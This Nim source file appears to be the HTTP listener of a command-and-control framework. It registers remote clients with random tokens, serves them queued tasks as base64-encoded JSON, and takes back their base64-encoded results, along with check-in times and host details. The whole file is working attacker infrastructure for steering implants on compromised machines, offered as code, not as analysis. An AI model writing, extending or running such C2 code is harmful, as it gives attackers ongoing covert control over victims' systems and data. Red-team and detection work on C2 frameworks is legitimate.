import std/[
  asyncdispatch, 
  asynchttpserver, 
  asyncfutures, 
  strutils, 
  json, 
  base64, 
  times
]

import ../types, ../logging, ../processMessage, ../events, ../../utils

proc createNewHttpListener*(server: C2Server, instance: ListenerInstance) {.async.} =
  let id = 1
  let ipAddress = instance.ipAddress
  let port = instance.port

  var clientMap: seq[tuple[token: string, client: ref C2Client]] = @[]

  var httpServer = newAsyncHttpServer()

  proc cb(req: Request) {.async.} =
    # echo (req.reqMethod, req.url, req.headers)
    let headers = {"Content-type": "text/plain; charset=utf-8"}
    if req.url.path == "/r":
      let token = rndStr()
      let cRef = new(ref C2Client)
      cRef[] = C2Client(
        id: token.split("-")[0],
        connected: true,
        loaded: false,
        isAdmin: false,
        hostname: "placeholder",
        username: "placeholder",
        server: server,
        ipAddress: req.hostname
      )
      clientMap.add (token: token, client: cRef)
      await req.respond(Http200, token, headers.newHttpHeaders())
    elif req.url.path == "/t":
      var client: ref C2Client
      let token = req.url.query.split("=")[1]
      for c in clientMap:
        if c.token == token:
          client = c.client
      if client.isNil():
        await req.respond(Http400, "error", headers.newHttpHeaders())
        return
      if req.reqMethod == HttpPost:
        if not client.isNil():
          discard processMessage(client, parseJson(decode(req.body))) 
          await req.respond(Http200, "ok", headers.newHttpHeaders())
        else: 
          await req.respond(Http400, "error", headers.newHttpHeaders())
      elif req.reqMethod == HttpGet:
        client.lastCheckin = now()
        var j: JsonNode = %*[]
        for task in server.tasks:
          if task.status == TaskCreated and task.client == client[]:
            j.add %*{
              "task": task.action,
              "taskId": task.id,
              "data": task.arguments
            }
        onClientCheckin(client[])
        await req.respond(Http200, encode($j), headers.newHttpHeaders())

  httpServer.listen(port)

  infoLog "listening on " & ipAddress & ":" & $port.uint32 & " using a http server"
  while true:
    if httpServer.shouldAcceptRequest():
      await httpServer.acceptRequest(cb)
    else:
      # too many concurrent connections, `maxFDs` exceeded
      # wait 500ms for FDs to be closed
      await sleepAsync(500)


let listener* = Listener(
  name: "http",
  startProc: createNewHttpListener
)